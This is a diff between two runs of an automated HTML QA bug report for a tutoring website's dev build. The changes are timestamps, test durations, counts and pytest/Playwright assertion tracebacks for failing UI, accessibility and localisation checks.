@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>QA Bug Report — 2026-10-19 07:52:08</title>
+<title>QA Bug Report — 2026-10-20 07:36:34</title>
 <style>
 /* ── Reset & base ── */
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
@@ -590,7 +590,7 @@ tr:hover td{background:#1c2333}
       </div>
     </div>
     <div class="hdr-meta">
-      <div><b>Date:</b> 2026-10-19 07:52:08</div>
+      <div><b>Date:</b> 2026-10-20 07:36:34</div>
       <div><b>Target:</b> </div>
       <div><b>AI Model:</b> unknown (local · no API key)</div>
       <div><b>Browser:</b> Chromium (headless)</div>
@@ -804,7 +804,7 @@ tr:hover td{background:#1c2333}
     <span class="badge LOW">LOW</span>
     <span class="badge P3">P3</span>
     <span class="cluster-count">2× affected</span>
-    <span class="recurrence-badge">24× consecutive runs</span>
+    <span class="recurrence-badge">25× consecutive runs</span>
   </div>
   <div class="cluster-title">Uncategorized failure</div>
   <div class="cluster-tickets"><a href="#QA-10 -005" class="cluster-bug-link">QA-10 -005</a> <a href="#QA-10 -006" class="cluster-bug-link">QA-10 -006</a></div>
@@ -860,7 +860,7 @@ tr:hover td{background:#1c2333}
 <details class="td-spec-row">
   <summary>
     <span class="td-spec-name">📄 login</span>
-    <span class="td-count">27 test(s)</span>
+    <span class="td-count">37 test(s)</span>
     <span class="td-data-count">0 input(s)</span>
   </summary>
   <div class="td-spec-body">
@@ -1021,10 +1021,10 @@ tr:hover td{background:#1c2333}
 <details class="td-type-row">
   <summary>
     <span class="td-type-name">validation</span>
-    <span class="td-count">1 test(s)</span>
+    <span class="td-count">11 test(s)</span>
     <span class="td-data-count">0 input(s)</span>
   </summary>
-  <div class="td-type-body"><div class="td-empty">No explicit test data — tests use only the URL or assertion-only checks</div></div>
+  <div class="td-type-body"><ul class="td-data-list"><li><code>test_login_page_loads</code>: <span class="td-src">BASE_URL</span></li></ul></div>
 </details>
 <details class="td-type-row">
   <summary>
@@ -1075,8 +1075,8 @@ tr:hover td{background:#1c2333}
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_page_title_contains_mehad</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.00s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.40s</span>
         
         
       </div>
@@ -1136,15 +1136,15 @@ tr:hover td{background:#1c2333}
 <div class="err-body" id="err-1">
   <pre style="margin-top:8px"><strong style="color:var(--c-critical)">E   AssertionError: Brand name not in title: 'Radd'
 E   assert ('mehad' in 'radd' or 'مهد' in 'Radd')
-E    +  where 'radd' = &lt;built-in method lower of str object at 0x7f7d169350e0&gt;()
-E    +    where &lt;built-in method lower of str object at 0x7f7d169350e0&gt; = 'Radd'.lower</strong>
+E    +  where 'radd' = &lt;built-in method lower of str object at 0x7f0449c682a0&gt;()
+E    +    where &lt;built-in method lower of str object at 0x7f0449c682a0&gt; = 'Radd'.lower</strong>
 
 tests/test_qa_comprehensive.py:166: in test_qa01_page_title_contains_mehad
     assert &quot;mehad&quot; in title.lower() or &quot;مهد&quot; in title, (
 E   AssertionError: Brand name not in title: 'Radd'
 E   assert ('mehad' in 'radd' or 'مهد' in 'Radd')
-E    +  where 'radd' = &lt;built-in method lower of str object at 0x7f7d169350e0&gt;()
-E    +    where &lt;built-in method lower of str object at 0x7f7d169350e0&gt; = 'Radd'.lower</pre>
+E    +  where 'radd' = &lt;built-in method lower of str object at 0x7f0449c682a0&gt;()
+E    +    where &lt;built-in method lower of str object at 0x7f0449c682a0&gt; = 'Radd'.lower</pre>
 </div>
     
     <div style="margin-top:16px"></div>
@@ -1169,8 +1169,8 @@ E    +    where &lt;built-in method lower of str object at 0x7f7d169350e0&gt; = 
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_header_logo_visible</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.03s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.32s</span>
         
         
       </div>
@@ -1263,8 +1263,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_header_navigation_links_present</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.02s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.29s</span>
         
         
       </div>
@@ -1357,8 +1357,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_language_toggle_buttons_present</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.03s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.31s</span>
         
         
       </div>
@@ -1451,8 +1451,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_hero_headline_present</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 1.94s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.33s</span>
         
         
       </div>
@@ -1545,8 +1545,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_hero_platform_badge_present</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.01s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.32s</span>
         
         
       </div>
@@ -1637,8 +1637,8 @@ E   assert ('saudi' in '' or '1,200' in '' or '50,000' in '')</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_hero_stats_non_empty</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.12s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.32s</span>
         
         
       </div>
@@ -1699,13 +1699,13 @@ E   assert ('saudi' in '' or '1,200' in '' or '50,000' in '')</pre>
   <pre style="margin-top:8px"><strong style="color:var(--c-critical)">    assert any(x in content for x in [&quot;1,200&quot;, &quot;1200&quot;, &quot;50,000&quot;, &quot;50000&quot;, &quot;98%&quot;]), (
 E   AssertionError: Hero stats are missing or not rendered
 E   assert False
-E    +  where False = any(&lt;generator object TestQA01Functional.test_qa01_hero_stats_non_empty.&lt;locals&gt;.&lt;genexpr&gt; at 0x7f7d16969560&gt;)</strong>
+E    +  where False = any(&lt;generator object TestQA01Functional.test_qa01_hero_stats_non_empty.&lt;locals&gt;.&lt;genexpr&gt; at 0x7f044932f440&gt;)</strong>
 
 tests/test_qa_comprehensive.py:228: in test_qa01_hero_stats_non_empty
     assert any(x in content for x in [&quot;1,200&quot;, &quot;1200&quot;, &quot;50,000&quot;, &quot;50000&quot;, &quot;98%&quot;]), (
 E   AssertionError: Hero stats are missing or not rendered
 E   assert False
-E    +  where False = any(&lt;generator object TestQA01Functional.test_qa01_hero_stats_non_empty.&lt;locals&gt;.&lt;genexpr&gt; at 0x7f7d16969560&gt;)</pre>
+E    +  where False = any(&lt;generator object TestQA01Functional.test_qa01_hero_stats_non_empty.&lt;locals&gt;.&lt;genexpr&gt; at 0x7f044932f440&gt;)</pre>
 </div>
     
     <div style="margin-top:16px"></div>
@@ -1730,8 +1730,8 @@ E    +  where False = any(&lt;generator object TestQA01Functional.test_qa01_hero
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_tutor_search_form_present</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.01s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.33s</span>
         
         
       </div>
@@ -1824,8 +1824,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_find_teacher_navigates_to_find_tutors</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 9.97s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 10.28s</span>
         
         
       </div>
@@ -1927,8 +1927,8 @@ E     - waiting for locator(&quot;button:has-text(\&quot;Find a Teacher\&quot;),
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_search_subject_dropdown_present</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.02s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.30s</span>
         
         
       </div>
@@ -2021,8 +2021,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_study_subjects_section_present</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.01s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.31s</span>
         
         
       </div>
@@ -2113,8 +2113,8 @@ E   assert ('most requested subjects' in '' or 'study subjects' in '' or ('math'
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_how_it_works_section_present</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.01s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.31s</span>
         
         
       </div>
@@ -2205,8 +2205,8 @@ E   assert ('how it works' in '' or 'three steps' in '' or ('choose a teacher' i
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_top_teachers_section_present</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.02s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.31s</span>
         
         
       </div>
@@ -2297,8 +2297,8 @@ E   assert ('top teachers' in '' or 'our teachers' in '' or ('per hour' in '' or
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_footer_present_with_links</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.07s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.28s</span>
         
         
       </div>
@@ -2391,8 +2391,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_student_reviews_section_present</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.00s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.29s</span>
         
         
       </div>
@@ -2483,8 +2483,8 @@ E   assert ('students say' in '' or 'student reviews' in '' or ('trust mehad' in
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_login_modal_opens_on_button_click</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 15.58s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 15.88s</span>
         
         
       </div>
@@ -2571,8 +2571,8 @@ E    +    where is_visible = &lt;Locator frame=&lt;Frame name= url='https://dev.
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_modal_has_welcome_back_title</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 30.57s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 30.84s</span>
         
         
       </div>
@@ -2687,8 +2687,8 @@ E     - waiting for locator(&quot;[role=\&quot;dialog\&quot;]&quot;).first</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_modal_has_sign_in_subtitle</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 30.59s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 30.87s</span>
         
         
       </div>
@@ -2803,8 +2803,8 @@ E     - waiting for locator(&quot;[role=\&quot;dialog\&quot;]&quot;).first</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_modal_has_whatsapp_number_label</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 30.59s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 30.86s</span>
         
         
       </div>
@@ -2919,8 +2919,8 @@ E     - waiting for locator(&quot;[role=\&quot;dialog\&quot;]&quot;).first</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_modal_country_code_default_is_966</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 15.61s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 15.86s</span>
         
         
       </div>
@@ -3007,8 +3007,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_send_code_button_present</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 15.58s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 15.85s</span>
         
         
       </div>
@@ -3095,8 +3095,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_send_code_disabled_without_phone</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 20.59s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 20.84s</span>
         
         
       </div>
@@ -3192,8 +3192,8 @@ E     - waiting for locator(&quot;button:has-text(\&quot;Send Code\&quot;)&quot;
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_modal_close_button_present</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 15.58s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 15.87s</span>
         
         
       </div>
@@ -3280,8 +3280,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_modal_closes_on_close_button_click</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 30.61s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 30.84s</span>
         
         
       </div>
@@ -3378,8 +3378,8 @@ E     - waiting for locator(&quot;[aria-label=\&quot;Close\&quot;]&quot;).first<
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_country_code_dropdown_opens</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 30.69s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 30.88s</span>
         
         
       </div>
@@ -3476,8 +3476,8 @@ E     - waiting for locator(&quot;[aria-label=\&quot;Country code\&quot;]&quot;)
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_country_search_filters_results</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 30.56s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 30.83s</span>
         
         
       </div>
@@ -3580,8 +3580,8 @@ E     - waiting for locator(&quot;[aria-label=\&quot;Country code\&quot;]&quot;)
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_country_bangladesh_selectable</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 30.59s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 30.83s</span>
         
         
       </div>
@@ -3684,8 +3684,8 @@ E     - waiting for locator(&quot;[aria-label=\&quot;Country code\&quot;]&quot;)
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_send_code_enabled_after_phone_entry</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 30.57s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 30.83s</span>
         
         
       </div>
@@ -3790,8 +3790,8 @@ E     - waiting for locator(&quot;[aria-label=\&quot;Country code\&quot;]&quot;)
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_full_login_flow_success</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 30.56s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 30.87s</span>
         
         
       </div>
@@ -3896,8 +3896,8 @@ E     - waiting for locator(&quot;[aria-label=\&quot;Country code\&quot;]&quot;)
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_otp_input_appears_after_send_code</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 30.56s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 30.83s</span>
         
         
       </div>
@@ -4002,8 +4002,8 @@ E     - waiting for locator(&quot;[aria-label=\&quot;Country code\&quot;]&quot;)
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_resend_timer_appears_after_send_code</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 30.57s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 30.87s</span>
         
         
       </div>
@@ -4108,8 +4108,8 @@ E     - waiting for locator(&quot;[aria-label=\&quot;Country code\&quot;]&quot;)
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_change_number_link_appears_after_send</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 30.59s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 30.82s</span>
         
         
       </div>
@@ -4214,8 +4214,8 @@ E     - waiting for locator(&quot;[aria-label=\&quot;Country code\&quot;]&quot;)
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_become_a_tutor_link_navigates</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.03s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.33s</span>
         
         
       </div>
@@ -4308,8 +4308,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_how_it_works_link_navigates</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.00s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.31s</span>
         
         
       </div>
@@ -4402,8 +4402,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_about_us_link_navigates</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.00s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.31s</span>
         
         
       </div>
@@ -4496,8 +4496,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_language_toggle_ar_navigates</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 6.97s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 7.29s</span>
         
         
       </div>
@@ -4599,8 +4599,8 @@ E     - waiting for locator(&quot;[aria-label=\&quot;العربية\&quot;]&quot
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_find_tutors_page_loads</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.00s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.31s</span>
         
         
       </div>
@@ -4685,8 +4685,8 @@ E   assert ('tutor' in '' or 'teacher' in '')</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa01_find_tutors_page_shows_tutor_cards</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 3.99s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 4.30s</span>
         
         
       </div>
@@ -4771,8 +4771,8 @@ E   assert ('per hour' in 'welcometoradd\n\nwelcomesubtitle\n\nsign increate acc
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa06_no_sensitive_headers_exposed</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.02s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 1.90s</span>
         
         
       </div>
@@ -4858,7 +4858,7 @@ E     ? ++++++++</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa06_json_responses_are_well_formed</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
+        <span>🕐 2026-10-20 07:36:33</span>
         <span>⏱ 0.00s</span>
         
         
@@ -4942,8 +4942,8 @@ E   ModuleNotFoundError: No module named 'jsonschema'</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa07_html_lang_attribute_set</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.05s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 1.93s</span>
         
         
       </div>
@@ -5034,8 +5034,8 @@ E   assert (None)</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa07_page_has_main_landmark</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.04s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 1.95s</span>
         
         
       </div>
@@ -5128,8 +5128,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa07_heading_hierarchy_starts_with_h1</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.06s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 1.91s</span>
         
         
       </div>
@@ -5220,8 +5220,8 @@ E   assert 0 &gt;= 1</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa07_modal_has_dialog_role</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 15.60s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 15.43s</span>
         
         
       </div>
@@ -5308,8 +5308,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa07_modal_close_button_has_aria_label</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 15.57s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 15.41s</span>
         
         
       </div>
@@ -5396,8 +5396,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa07_language_buttons_aria_labels_correct</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.07s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 1.90s</span>
         
         
       </div>
@@ -5490,8 +5490,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa08_wide_4k_no_layout_break</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.03s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.04s</span>
         
         
       </div>
@@ -5584,8 +5584,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa08_find_tutors_mobile_shows_cards</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 3.53s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 3.48s</span>
         
         
       </div>
@@ -5670,8 +5670,8 @@ E   assert ('tutor' in 'welcometoradd\n\nwelcomesubtitle\n\nsign increate accoun
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa09_html_lang_attribute_present</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.68s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.41s</span>
         
         
       </div>
@@ -5762,8 +5762,8 @@ E   assert (None)</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa09_h1_exists_and_unique</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.56s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.34s</span>
         
         
       </div>
@@ -5854,8 +5854,8 @@ E   assert 0 &gt;= 1</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa09_title_length_reasonable</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.55s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.30s</span>
         
         
       </div>
@@ -5947,8 +5947,8 @@ E    +  where 4 = len('Radd')</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa10_html_lang_is_ar</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.18s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.69s</span>
         
         
       </div>
@@ -6002,15 +6002,15 @@ E    +  where 4 = len('Radd')</pre>
 <div class="err-body" id="err-52">
   <pre style="margin-top:8px"><strong style="color:var(--c-critical)">E   AssertionError: &lt;html lang&gt; on /ar is '', expected ar*
 E   assert False
-E    +  where False = &lt;built-in method startswith of str object at 0x7ff4268225d0&gt;('ar')
-E    +    where &lt;built-in method startswith of str object at 0x7ff4268225d0&gt; = ''.startswith</strong>
+E    +  where False = &lt;built-in method startswith of str object at 0x7fcaaa2225d0&gt;('ar')
+E    +    where &lt;built-in method startswith of str object at 0x7fcaaa2225d0&gt; = ''.startswith</strong>
 
 tests/test_qa_comprehensive.py:2338: in test_qa10_html_lang_is_ar
     assert lang.startswith(&quot;ar&quot;), f&quot;&lt;html lang&gt; on /ar is {lang!r}, expected ar*&quot;
 E   AssertionError: &lt;html lang&gt; on /ar is '', expected ar*
 E   assert False
-E    +  where False = &lt;built-in method startswith of str object at 0x7ff4268225d0&gt;('ar')
-E    +    where &lt;built-in method startswith of str object at 0x7ff4268225d0&gt; = ''.startswith</pre>
+E    +  where False = &lt;built-in method startswith of str object at 0x7fcaaa2225d0&gt;('ar')
+E    +    where &lt;built-in method startswith of str object at 0x7fcaaa2225d0&gt; = ''.startswith</pre>
 </div>
     
     <div style="margin-top:16px"></div>
@@ -6035,8 +6035,8 @@ E    +    where &lt;built-in method startswith of str object at 0x7ff4268225d0&g
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa10_html_dir_is_rtl</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 2.20s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 2.61s</span>
         
         
       </div>
@@ -6124,8 +6124,8 @@ E     + ltr</pre>
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa10_language_toggle_to_english</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 3.70s</span>
+        <span>🕐 2026-10-20 07:36:33</span>
+        <span>⏱ 4.09s</span>
         
         
       </div>
@@ -6212,8 +6212,8 @@ E    +    where count = &lt;Locator frame=&lt;Frame name= url='https://dev.prowh
       <div class="bug-meta">
         <span>🔗 <a href="" target="_blank"></a></span>
         <span>🧪 <code>test_qa10_language_toggle_to_arabic</code></span>
-        <span>🕐 2026-10-19 07:52:08</span>
-        <span>⏱ 3.65s</span>
